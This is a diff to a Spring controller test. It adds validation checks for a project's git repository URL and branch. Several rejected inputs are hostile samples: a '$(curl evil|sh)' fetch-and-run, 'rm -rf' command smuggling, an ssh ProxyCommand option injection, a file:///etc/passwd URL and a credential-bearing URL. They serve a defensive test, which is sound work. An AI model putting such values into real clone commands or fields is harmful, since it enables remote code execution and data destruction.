@@ -101,7 +101,10 @@ class ProjectControllerTest {
         0,
         0,
         java.util.List.of(),
-        true);
+        true,
+        "OWNER",
+        null,
+        null);
   }
 
   @Test
@@ -140,7 +143,10 @@ class ProjectControllerTest {
             0,
             0,
             java.util.List.of(),
-            true);
+            true,
+            "OWNER",
+            null,
+            null);
     when(projectService.create(eq(1L), any())).thenReturn(personal);
 
     mockMvc
@@ -267,9 +273,63 @@ class ProjectControllerTest {
                 .contentType(MediaType.APPLICATION_JSON)
                 .content(
                     objectMapper.writeValueAsString(
-                        new UpdateProjectRequest("Updated", "new", null))))
+                        new UpdateProjectRequest("Updated", "new", null, null, null))))
         .andExpect(status().isOk())
         .andExpect(jsonPath("$.key").value("WP"));
+  }
+
+  /** WP-1011 — 저장소 주소는 https·ssh·git@ 만, 브랜치는 git 이름 글자만. 빈 값(지우기)은 통과. */
+  @Test
+  void update_repositoryFormat_validated() throws Exception {
+    mockAuthentication("project:write");
+    when(projectService.update(eq(1L), eq("WP"), any())).thenReturn(sampleProject());
+    for (String bad :
+        new String[] {
+          "{\"repositoryUrl\":\"file:///etc/passwd\"}",
+          "{\"repositoryUrl\":\"https://x.com/a b\"}",
+          // 셸 글자 — AI 컴퓨터가 clone 명령으로 실행한다
+          "{\"repositoryUrl\":\"https://x.com/$(curl evil|sh)\"}",
+          "{\"repositoryUrl\":\"git@h.com:x;rm -rf ~\"}",
+          "{\"repositoryUrl\":\"ssh://-oProxyCommand=x/a\"}",
+          // 주소에 든 자격 증명 — 프로젝트를 보는 모두에게 보인다
+          "{\"repositoryUrl\":\"https://user:ghp_tok@github.com/a/b.git\"}",
+          "{\"repositoryBranch\":\"main; rm -rf\"}",
+          "{\"repositoryBranch\":\"-x\"}",
+          // git 이 브랜치 이름으로 받지 않는 것 — clone --branch 가 실패한다
+          "{\"repositoryBranch\":\"feat..x\"}",
+          "{\"repositoryBranch\":\"release/\"}",
+          "{\"repositoryBranch\":\"a//b\"}",
+          "{\"repositoryBranch\":\"main.lock\"}",
+          "{\"repositoryBranch\":\".hidden\"}",
+          "{\"repositoryUrl\":\"http://git.corp/a.git\"}"
+        }) {
+      mockMvc
+          .perform(
+              patch("/api/v1/projects/WP")
+                  .header("Authorization", "Bearer valid-token")
+                  .contentType(MediaType.APPLICATION_JSON)
+                  .content(bad))
+          .andExpect(status().isBadRequest());
+    }
+    for (String ok :
+        new String[] {
+          "{\"repositoryUrl\":\"git@github.com:acme/app.git\",\"repositoryBranch\":\"release/1.0\"}",
+          "{\"repositoryUrl\":\"ssh://git@gitlab.example.com:2222/grp/sub/app.git\"}",
+          "{\"repositoryUrl\":\"https://github.com/octocat/Hello-World.git\"}",
+          // git@ 가 아닌 사용자·절대 경로의 scp 형식
+          "{\"repositoryUrl\":\"deploy@git.corp:org/app.git\"}",
+          "{\"repositoryUrl\":\"gitlab@git.corp:/srv/repo.git\"}",
+          "{\"repositoryBranch\":\"feature/WP-1011_x.y\"}",
+          "{\"repositoryUrl\":\"\",\"repositoryBranch\":\"\"}"
+        }) {
+      mockMvc
+          .perform(
+              patch("/api/v1/projects/WP")
+                  .header("Authorization", "Bearer valid-token")
+                  .contentType(MediaType.APPLICATION_JSON)
+                  .content(ok))
+          .andExpect(status().isOk());
+    }
   }
 
   /** #858 — 부분 수정이라 name 은 생략할 수 있지만, 보낸다면 공백일 수 없다. */
